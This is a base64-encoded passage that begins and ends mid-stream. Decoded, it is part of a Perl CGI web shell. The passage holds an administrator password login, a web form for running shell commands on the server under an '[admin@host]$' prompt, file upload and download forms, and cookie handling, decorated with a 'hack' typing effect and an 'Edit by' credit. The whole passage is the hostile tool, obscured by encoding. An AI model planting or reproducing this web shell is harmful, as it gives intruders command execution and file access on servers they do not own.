XIgPSAwOw0KICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7DQogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsNCiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsNCiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgdGhpcy50YWdCdWZmZXIgPSAiIjsNCiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7DQp9DQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOw0KVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOw0KVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsNCiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsNCn0NClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgew0KICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsNCiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLg0KICAgIHJldHVybjsNCiAgfQ0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7DQovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuDQogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgew0KICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7DQogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7DQogICAgICB0aGlzLmluVGFnID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2Ugew0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICB9DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOw0KICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7DQogIH0gZWxzZSB7DQoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KCXRoaXMuY3VycmVudENoYXIgPSAwOw0KICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KPC9wcmU+DQoNCjxicj4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KbmV3IFR5cGluZ1RleHQoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhhY2siKSwgMzAsIGZ1bmN0aW9uKGkpeyB2YXIgYXIgPSBuZXcgQXJyYXkoIl8iLCIiKTsgcmV0dXJuICIgIiArIGFyW2kubGVuZ3RoICUgYXIubGVuZ3RoXTsgfSk7DQpUeXBpbmdUZXh0LnJ1bkFsbCgpOw0KDQo8L3NjcmlwdD4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBlbmNvZGUgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXJsRW5jb2RlKCQpew0KCW15ICRzdHIgPSBzaGlmdDsNCgkkc3RyID1+IHMvKFteQS1aYS16MC05XSkvc3ByaW50ZigiJSUlMDJYIiwgb3JkKCQxKSkvc2VnOw0KCXJldHVybiAkc3RyOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsNCglteSAkdGV4dCA9IHNoaWZ0Ow0KCSR0ZXh0ID1+IHMvJi8mYW1wOy9nOw0KCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsNCgkkdGV4dCA9fiBzLycvJy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii5lbmNvZGVfYmFzZTY0KCRwYXRoKS4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KDQpQYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KTG9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQ0KIyB2YXJpYWJsZSAkQ29va2llc3snJ30NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBHZXRDb29raWVzDQp7DQoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCglmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0KCXsNCgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KCQkkQ29va2llc3skaWR9ID0gJHZhbDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjRkZGRkZGJz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiIgb25TdWJtaXQ9IkVuY29kZXIoJ2MnKSI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI0MCIgbmFtZT0iYyIgaWQ9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KDQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCjxsYWJlbCBmb3I9InVwIj5PdmVyd3JpdGUgaWYgaXQgRXhpc3RzPC9sYWJlbD48YnI+PGJyPg0KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0KPC90ZXh0YXJlYT4NCjxicj48Zm9udCBjb2xvcj15ZWxsb3c+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250Pg0KRU5EDQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglteSAkcmVzdWx0PSIiOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkcmVzdWx0IC49IDw8RU5EOw0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQoNCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4NCkVORA0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t